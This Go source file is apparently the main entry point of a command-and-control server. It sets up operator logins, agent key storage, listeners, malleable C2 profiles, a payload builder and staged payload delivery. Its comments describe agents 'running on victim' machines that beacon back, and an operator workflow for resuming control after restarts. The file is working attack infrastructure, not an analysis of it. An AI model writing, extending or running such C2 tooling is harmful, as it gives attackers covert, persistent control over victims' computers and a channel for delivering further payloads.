package main

import (
        "crypto/tls"
        "fmt"
        "log"
        "net/http"
        "os"
        "os/signal"
        "syscall"
        "time"
)

var startTime time.Time

func main() {
        startTime = time.Now()

        // ── Load .env file BEFORE config ──────────────────────────────
        // Priority: 1) ./hero-data/.env  (portable, CWD-relative)
        //           2) /etc/hero/.env    (system-wide, from setup.sh)
        //
        // Shell env vars always WIN over .env values.
        // So:  C2_PASSWORD=xxx ./c2-server  still works.
        LoadDotEnv("hero-data/.env", "/etc/hero/.env")

        cfg := LoadConfig()
        log.Printf("[SERVER] C2 Server starting...")
        log.Printf("[SERVER] API bind: %s:%d", cfg.APIHost, cfg.APIPort)
        log.Printf("[SERVER] Agent host: %s:%d", cfg.Host, cfg.Port)

        // Init core
        LoadOperators()           // parse C2_OPERATORS (or fallback to C2_PASSWORD)
        InitAgentStore()          // PSK persistence — must be first (before builder/listeners)
        InitIPFilter()            // Load IP blocklist (builtin + dynamic file)
        InitCrypto(cfg.EncryptionKey)
        InitSessions()
        // ════════════════════════════════════════════════════════════════════
        // SESSION PERSISTENCE — DISABLED (operator-driven redesign)
        // ════════════════════════════════════════════════════════════════════
        //
        // The previous SQLite-backed session restore (initSessionDB +
        // LoadPersistedSessions) was REMOVED because it broke the operator
        // workflow on server restart:
        //
        //   1. Operator shuts down the server overnight (agent still
        //      running on victim, doing nothing — just sleeping between
        //      beacons)
        //   2. Operator restarts the server in the morning
        //   3. Operator logs in
        //   4. Operator EXPECTS to manually start the listener they
        //      want to use (the agent's baked config has the listener
        //      name + PSK, so agent will reconnect via the listener the
        //      operator chooses to start)
        //   5. Operator waits for agent to reconnect
        //   6. Operator reviews what they did yesterday (task history)
        //
        // With auto-restore, step 4 was broken — old sessions appeared
        // on the dashboard BEFORE the listener was even started. Operator
        // couldn't tell if the agent was actually back or it was a ghost.
        //
        // NEW behavior:
        //   - Server startup does NOT auto-restore sessions
        //   - Agent reconnection creates a FRESH session (new UUID) in
        //     memory — agent verified via PSK in vault.db (which still
        //     works, unchanged)
        //   - Per-session HISTORY FILES are written to agent_db/history_*.log
        //     on every task queued/completed — operator can `cat` them to
        //     review what they did with each agent before the restart
        //   - vault.db + psk_store.json unchanged (agent reconnection
        //     verification + build records)
        //
        // Operator workflow on restart:
        //   ./bin/c2-server              # server starts, no sessions
        //   ./bin/c2-client               # login
        //   # operator checks agent_db/psk_store.json to see what was built
        //   # operator starts the right listener via the GUI
        //   # agent reconnects → fresh session created
        //   # operator `cat agent_db/history_<id>.log` to see yesterday's work
        //
        // ════════════════════════════════════════════════════════════════════
        // initSessionDB + LoadPersistedSessions are NO LONGER called.
        // session_store.go is kept for backwards compat (the file format
        // is still understood — old sessions.db files are simply ignored).
        // The new history_store.go writes per-session text files instead.
        // ════════════════════════════════════════════════════════════════════
        ensureHistoryDir() // make sure agent_db/ exists for history files
        log.Printf("[HISTORY] Per-session text history files in %s/", historyDir)
        InitListeners(cfg)
        // Malleable C2 profiles (profiles/*.toml) — must load BEFORE any
        // listener starts so every listener mux registers profile URIs.
        LoadProfiles(FindProfilesDir())
        // v3 staged delivery — rehydrate registered stage payloads from disk
        LoadStageStore(heroRootDir())

        InitBuilder(cfg)

        // Setup routes
        mux := http.NewServeMux()
        SetupAPIRoutes(mux)
        SetupAgentRoutes(mux)
        SetupStageRoutes(mux) // v3: stage downloads also reachable on the API mux
        SetupWSRoute(mux)

        // TLS config — TLS 1.3 minimum for API server (operator connections)
        // Agents connect via their own listener (which uses the same cert)
        tlsCfg := &tls.Config{
                MinVersion: tls.VersionTLS13,
                CurvePreferences: []tls.CurveID{
                        tls.X25519,
                        tls.CurveP256,
                },
        }

        apiSrv := &http.Server{
                Addr:      fmt.Sprintf("%s:%d", cfg.APIHost, cfg.APIPort),
                Handler:   CORSMiddleware(LogMiddleware(mux)),
                TLSConfig: tlsCfg,
        }

        // Graceful shutdown
        go func() {
                sigCh := make(chan os.Signal, 1)
                signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
                <-sigCh
                log.Println("[SERVER] Shutting down...")
                apiSrv.Close()
                StopAllListeners()
        }()

        // ══════════════════════════════════════════════════════════════════
        // BEACON ARCHITECTURE — SERVER IS PASSIVE
        // ══════════════════════════════════════════════════════════════════
        //
        // Beacon = WhatsApp message, NOT phone call.
        // Agent controls timing. Server only records last_seen.
        //
        // NO REAPER. Server NEVER marks a session dead.
        // Status is DERIVED on-the-fly in GetAllSessions():
        //   • Active=true,  Stale=false → ALIVE   (checking in normally)
        //   • Active=true,  Stale=true  → SLEEPING (overdue but expected back)
        //   • Active=false              → DEAD    (operator manually killed)
        //
        // The only way a session becomes DEAD is operator action (RemoveSession).
        // Agent will keep sleeping → waking → checking in → sleeping.
        // Server just waits. Trust the beacon.
        // ══════════════════════════════════════════════════════════════════

        log.Printf("[SERVER] API server listening on %s:%d", cfg.APIHost, cfg.APIPort)
        if cfg.UseTLS {
                if err := apiSrv.ListenAndServeTLS(cfg.TLSCert, cfg.TLSKey); err != nil && err != http.ErrServerClosed {
                        log.Fatalf("[SERVER] API TLS error: %v", err)
                }
        } else {
                if err := apiSrv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
                        log.Fatalf("[SERVER] API error: %v", err)
                }
        }
}